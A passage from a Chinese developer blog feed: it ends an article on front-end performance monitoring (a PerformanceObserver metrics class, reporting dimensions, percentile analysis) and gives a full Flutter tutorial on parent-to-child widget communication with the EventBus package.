      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span>) {
        observer.<span class="hljs-title function_">disconnect</span>();
      }
    };

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(observerCallback);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'navigation'</span>, <span class="hljs-string">'paint'</span>, <span class="hljs-string">'resource'</span>] });
  }

  <span class="hljs-comment">// 收集性能数据</span>
  <span class="hljs-title function_">collectPerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startObserving</span>();

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkMetricsReady</span> = (<span class="hljs-params"/>) =&gt; {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span>) {
            <span class="hljs-title function_">resolve</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">setTimeout</span>(checkMetricsReady, <span class="hljs-variable constant_">TIME</span>);
          }
        };

        <span class="hljs-title function_">checkMetricsReady</span>();
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-title function_">reject</span>(error);
      }
    });
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getPerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>;
  }
}
</code></pre>
<p>使用起来也非常便捷：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">PerformanceMetrics</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"xxx"</span>
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">const</span> pMs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceMetrics</span>()
<span class="hljs-keyword">const</span> perf = pMs.<span class="hljs-title function_">getPerformance</span>()
<span class="hljs-comment">// ...</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(perf)
</code></pre>
<p>后续我们可以根据获取到的指标进行分析处理…</p>
<h3 data-id="heading-17">数据上报的维度</h3>
<p>这里我们不说具体的上报方法，而是来说一下数据上报的维度。</p>
<p>为了确保我们RUM分析的全面性，有时仅有这些性能指标的数据是远远不够的，还需要从多个维度综合考虑。数据上报的维度可以分为<strong>常规维度</strong>和<strong>特殊维度。</strong></p>
<h4 data-id="heading-18">常规维度</h4>
<p>常规维度具有普遍性和基础性，适用于大多数的数据收集和监控场景：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2103029ab461452c9e0d42434033e39c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=RoogVd6zX8kc8BK8lRFr6%2F%2FewOk%3D" alt="Clipboard_Screenshot_1765866434.png" loading="lazy"/></p>
<h4 data-id="heading-19">特殊维度</h4>
<p>这些维度主要用于特定的应用场景或者进行深度分析时使用，通常与业务相关，或用于分析性能异常和用户行为：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dc68440b6a84ea1bba0763e81495b84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=gdlPXzvxCQuHvpw1aalG9tvbZ5I%3D" alt="Clipboard_Screenshot_1765866441.png" loading="lazy"/></p>
<h2 data-id="heading-20">分析性能数据及影响因素</h2>
<p>数据辛辛苦苦采集到了，分析数据就别搞得草草率率的了。</p>
<h4 data-id="heading-21">时间分布</h4>
<p>最常见的分析性能数据的切入点就是时间分布了。通常要结合<strong>平均值</strong>、<strong>中位数</strong>和<strong>百分位数</strong>来进行性能评估，单一分析一指标的话往往容易误判用户真实体验。</p>
<ul>
<li>
<p>如果我只看平均值</p>
<p>假设网页加载时间的平均值是<strong>3秒</strong>，但其中少部分用户因网络条件差，加载时间可能超过<strong>10秒</strong>。这些极端值会拉高整体平均值，<strong>掩盖了大多数用户实际较好的体验</strong>。</p>
</li>
<li>
<p>如果我只看中位数</p>
<p>如果中位数是<strong>2.5秒</strong>，说明一半用户加载时间低于这个值。这比平均值更稳定，但依然<strong>无法体现尾部用户的极差体验</strong>。</p>
</li>
<li>
<p>如果我只看百分位数</p>
<p>（你想看百分之多少呢？）</p>
<p>对于高性能要求的业务，<strong>你更应该关注尾部用户的体验</strong>，例如<strong>P95/P99</strong>等。（如果P95为<strong>5秒</strong>，意味着<strong>95%<strong>的用户加载时间低于</strong>5</strong>秒，还有**5%**用户比这慢）</p>
</li>
</ul>
<p>所以分析性能指标时<strong>建议关注百分位数</strong>，对性能的要求越高，使用越大的百分位数，同时在关注百分位数的要结合平均值和中位数一起分析。</p>
<h4 data-id="heading-22">资源类型归类</h4>
<p>我们也可以选择对资源类型进行归类分析，这其实也是对性能分析的一个比较重要的地方。</p>
<p>试想明明你想分析首页加载时间，结果相关资源直接加载失败了，甚至都加载出来，这肯定是在性能监控分析之上更不可能容忍的。</p>
<p>按照资源类型来分析的常见内容有：</p>






























<table><thead><tr><th>资源</th><th>示例</th><th>部分分析</th></tr></thead><tbody><tr><td>JavaScript</td><td>应用包、SDK</td><td>包体积、执行时间、长任务</td></tr><tr><td>CSS</td><td>主样式、字体加载</td><td>阻塞渲染、未使用样式</td></tr><tr><td>图片</td><td>img、icon</td><td>是否压缩、懒加载</td></tr><tr><td>第三方资源</td><td>广告</td><td>是否阻塞加载、错误率</td></tr></tbody></table>
<h4 data-id="heading-23">缓存与加速因素标记</h4>
<p>在分析性能数据的时候，缓存和某些加速因素也会对性能分析造成一定的“误判”影响。好比明明资源很大，加载很慢，结果浏览器缓存了，那我们此时再去监测资源的获取时间就非常“鸡肋”了。</p>
<p>有一些相对比较常见的因素，在分析时可以稍作留意：</p>
<ul>
<li>是否命中浏览器缓存/Service Worker</li>
<li>是否命中CDN加速节点</li>
<li>DNS是否走了预解析</li>
</ul>
<h2 data-id="heading-24">写在最后</h2>
<p>本文讲的内容多以概念性的东西为主，算不上深入浅出不过还是希望这篇文章可以对你有一些帮助，此外，文章中相对结合实际较少，理论性的内容终究还是要通过实践来加深理解。</p>
<p>如果文章里有错误或者需要补充的地方可以在评论区留言，如果可以的话也可以在评论区讨论交流呀，感谢大家🙏</p>
<p>（如果真的看到这了，可否三连支持下呢～）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter-使用EventBus实现组件间数据通信]]></title>    <link>https://juejin.cn/post/7583226204036513833</link>    <guid>https://juejin.cn/post/7583226204036513833</guid>    <pubDate>2025-12-15T00:40:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583226204036513833" data-draft-id="7581117416811544619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" flutter-使用EventBus实现组件间数据通信"/> <meta itemprop="keywords" content="前端,Flutter,Android"/> <meta itemprop="datePublished" content="2025-12-15T00:40:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹏多多"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             flutter-使用EventBus实现组件间数据通信
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹏多多
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T00:40:53.000Z" title="Mon Dec 15 2025 00:40:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">1. 效果预览</h2>
<p>在 Flutter 应用开发中，组件间的通信是一个常见且重要的需求。当涉及到父子组件之间复杂的交互时，使用事件总线（Event Bus）可以有效地实现解耦和灵活的消息传递。本文将通过一段具体的代码，详细介绍如何在 Flutter 中利用事件总线实现父子组件之间的通信。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebfa70468af644018b55aeea80cdbdde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP5aSa5aSa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766364053&amp;x-signature=lY2mGdzxw4VH3CvdYz6bcOCybFU%3D" alt="效果预览" loading="lazy"/></p>
<h2 data-id="heading-1">2. 安装插件</h2>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">event_bus:</span> <span class="hljs-string">^2.0.0</span>
</code></pre>
<p>创建eventBus.dart文件，写入以下内容：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:event_bus/event_bus.dart'</span>;

EventBus eventBus = EventBus();

<span class="hljs-comment">/// <span class="markdown">通知测试</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BusNotificationTest</span> </span>{
  <span class="hljs-built_in">int</span> index;
  BusNotificationTest(<span class="hljs-keyword">this</span>.index);
}
</code></pre>
<h2 data-id="heading-2">3. 结构分析</h2>
<p>这段代码展示了如何在 Flutter 中通过事件总线实现父子组件之间的通信，具体功能为：在父组件EventBusParentPage中，用户点击按钮后，会触发一个通知事件，子组件EventBusChildPage监听该事件，并根据事件携带的信息改变自身的背景颜色。</p>
<ol>
<li>父组件：EventBusParentPage</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">事件Bus通知父类</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusParentPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> EventBusParentPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  EventBusParentPageState createState() =&gt; EventBusParentPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusParentPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">EventBusParentPage</span>&gt; </span>{
  <span class="hljs-comment">/// <span class="markdown">颜色索引</span></span>
  <span class="hljs-built_in">int</span> index = <span class="hljs-number">0</span>;

  <span class="hljs-comment">/// <span class="markdown">通知变色</span></span>
  <span class="hljs-keyword">void</span> handleColorChange() {
    index++;
    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">2</span>) {
      index = <span class="hljs-number">0</span>;
    }
    eventBus.fire(BusNotificationTest(index));
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        Expanded(
            child: Container(
                alignment: Alignment.center,
                decoration: <span class="hljs-keyword">const</span> BoxDecoration(color: Colors.white),
                child: TextButton(
                    onPressed: handleColorChange,
                    child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'点击变色'</span>,
                        style: TextStyle(color: Colors.black, fontSize: <span class="hljs-number">20</span>))))),
        <span class="hljs-keyword">const</span> EventBusChildPage()
      ],
    );
  }
}
</code></pre>
<ul>
<li>组件定义：
<ul>
<li>EventBusParentPage是一个有状态组件，通过createState方法返回EventBusParentPageState实例，用于管理组件状态和构建 UI。</li>
</ul>
</li>
<li>状态变量：
<ul>
<li>index：一个整型变量，用于记录颜色索引，初始值为 0。这个索引将决定子组件最终显示的颜色。</li>
</ul>
</li>
<li>事件处理方法：
<ul>
<li>handleColorChange：当用户点击父组件中的按钮时，该方法被调用。它首先将index值增加 1，如果index超过 2，则重置为 0。然后，通过事件总线eventBus触发一个BusNotificationTest类型的事件，并将当前的index值作为参数传递给该事件。这里的eventBus应该是在全局或合适的作用域中定义的事件总线实例，BusNotificationTest则是一个自定义的事件类，用于携带数据（这里是颜色索引）。</li>
</ul>
</li>
<li>构建 UI：
<ul>
<li>在build方法中，父组件构建了一个垂直方向的Column布局。</li>
<li>第一个子组件是一个Expanded包裹的Container，其中包含一个TextButton。按钮的文本为 “点击变色”，当按钮被点击时，会调用handleColorChange方法。Container的背景颜色设置为白色。</li>
<li>第二个子组件是EventBusChildPage，这是需要接收事件通知的子组件，通过const关键字创建，意味着它是一个不可变的组件实例。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>子组件：EventBusChildPage</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">事件Bus通知子类</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusChildPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> EventBusChildPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  EventBusChildPageState createState() =&gt; EventBusChildPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusChildPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">EventBusChildPage</span>&gt; </span>{
  <span class="hljs-comment">/// <span class="markdown">颜色列表</span></span>
  <span class="hljs-built_in">List</span>&lt;Color&gt; colorList = [Colors.red, Colors.yellow, Colors.blue];

  <span class="hljs-comment">/// <span class="markdown">刷新监听</span></span>
  <span class="hljs-keyword">late</span> StreamSubscription&lt;BusNotificationTest&gt; eventBusExample;

  <span class="hljs-comment">/// <span class="markdown">背景颜色</span></span>
  <span class="hljs-keyword">late</span> Color bgColor;

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    bgColor = colorList[<span class="hljs-number">0</span>];
    <span class="hljs-comment">// 监听颜色索引变化</span>
    eventBusExample = eventBus.<span class="hljs-keyword">on</span>&lt;BusNotificationTest&gt;().listen((event) {
      setState(() {
        bgColor = colorList[event.index];
      });
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    eventBusExample.cancel();
    <span class="hljs-keyword">super</span>.dispose();
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> SizedBox(
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height / <span class="hljs-number">2</span>,
        child: Container(color: bgColor, child: <span class="hljs-keyword">null</span>));
  }
}
</code></pre>
<ul>
<li>组件定义：
<ul>
<li>EventBusChildPage同样是一个有状态组件，其createState方法返回EventBusChildPageState实例。</li>
</ul>
</li>
<li>状态变量
<ul>
<li>colorList：一个包含三种颜色（红色、黄色、蓝色）的列表，用于存储可供选择的背景颜色。</li>
<li>eventBusExample：一个StreamSubscription类型的变量，用于订阅事件总线eventBus上的BusNotificationTest类型的事件。这里使用late关键字声明，意味着在initState方法中会对其进行初始化。</li>
<li>bgColor：用于存储子组件当前的背景颜色，初始值为colorList中的第一个颜色（红色），同样使用late关键字声明，在initState方法中初始化。</li>
</ul>
</li>
<li>生命周期方法：
<ul>
<li>initState：在组件插入到 Widget 树时调用。首先调用父类的initState方法，然后初始化bgColor为colorList中的第一个颜色。接着，通过eventBus.on().listen方法，订阅事件总线上的BusNotificationTest事件。当接收到该事件时，会执行回调函数，在回调函数中，通过setState方法更新bgColor为colorList中对应索引的颜色。这里的event.index就是父组件触发事件时传递过来的颜色索引。</li>
<li>dispose：当组件从 Widget 树中移除时调用。在这个方法中，调用eventBusExample.cancel()取消对事件总线的订阅，防止内存泄漏，然后调用父类的dispose方法。</li>
</ul>
</li>
<li>构建 UI：
<ul>
<li>在build方法中，子组件构建了一个SizedBox，其宽度为屏幕宽度，高度为屏幕高度的一半。在SizedBox内部是一个Container，其背景颜色由bgColor决定。当bgColor因接收到事件通知而改变时，Container的背景颜色也会相应改变，从而实现了根据父组件通知动态更新子组件 UI 的效果。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">3. 总结</h2>
<p>通过上述代码，我们清晰地看到了如何在 Flutter 中利用事件总线实现父子组件之间的通信。父组件通过触发事件并携带相关数据，子组件通过订阅事件总线并根据接收到的事件数据更新自身状态和 UI。</p>
